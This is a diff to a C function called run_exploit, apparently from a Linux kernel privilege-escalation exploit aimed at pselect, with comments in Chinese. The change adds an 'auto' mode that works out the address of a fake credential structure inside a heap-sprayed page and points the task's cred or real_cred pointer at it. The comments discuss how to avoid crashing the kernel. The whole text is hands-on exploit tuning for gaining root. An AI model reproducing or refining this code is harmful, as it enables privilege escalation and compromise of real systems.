@@ -825,8 +825,27 @@ int run_exploit(int argc, char **argv) {
            * "mt48: PTR ... right=... [PTR_RIGHT override]" 行 — 没有该标记
            * = 静默回落 init_cred = 2/2 致死几何。 */
           char *mt54_ptr_right = getenv("PSELECT_PTR_RIGHT");
-          if (mt54_ptr_right) {
+          int mt55_auto = mt54_ptr_right && !strcmp(mt54_ptr_right, "auto");
+          const char *mt55_tag = "";
+          if (mt55_auto) {
+            /* mt55 (repair): PTR_RIGHT=auto → 喷页假 cred 精确地址。
+             * ⚠ 假 cred 在 payload_base+0x3800, 而 payload_base =
+             * page_base + SKB_DATA_DELTA(-0xe80) — 即 page_base+0x2980。
+             * 直接复用 util.c 同源宏计算, 任何手写 0x3800 都是 off-by-delta
+             * (我在 REPAIR 文档里写过的 "spray+0x3800" 指 payload 视角,
+             * 现场别按字面手填地址)。无喷页 (STATIC_LOCK) = 硬停: 静默
+             * 回落 init_cred 是 2/2 致死几何, 宁可不打。 */
+            if (!page_base) {
+              pr_error("mt55: PTR_RIGHT=auto but no spray page - ABORT attempt\n");
+              fflush(stdout);
+              break;
+            }
+            snprintf(right_env, sizeof(right_env), "%zx",
+                     (size_t)(page_base + SKB_DATA_DELTA + 0x3800));
+            mt55_tag = " [PTR_RIGHT auto=spray_fake_cred]";
+          } else if (mt54_ptr_right) {
             snprintf(right_env, sizeof(right_env), "%s", mt54_ptr_right);
+            mt55_tag = " [PTR_RIGHT override]";
           } else {
             snprintf(right_env, sizeof(right_env), "%zx",
                      (size_t)P0_DATA_ALIAS_CONST(INIT_CRED));
@@ -834,7 +853,7 @@ int run_exploit(int argc, char **argv) {
           snprintf(left_env, sizeof(left_env), "0");
           pr_info("mt48: PTR stage=%c task=%016zx pc=%s right=%s%s (STORE(a)→[%s])\n",
                   mt48_stage, (size_t)task, pc_env, right_env,
-                  mt54_ptr_right ? " [PTR_RIGHT override]" : "",
+                  mt55_tag,
                   mt48_stage == 'R' ? "task+0x778 real_cred" : "task+0x780 cred");
           fflush(stdout);
         } else if (getenv("PSELECT_FIX_MODE")) {
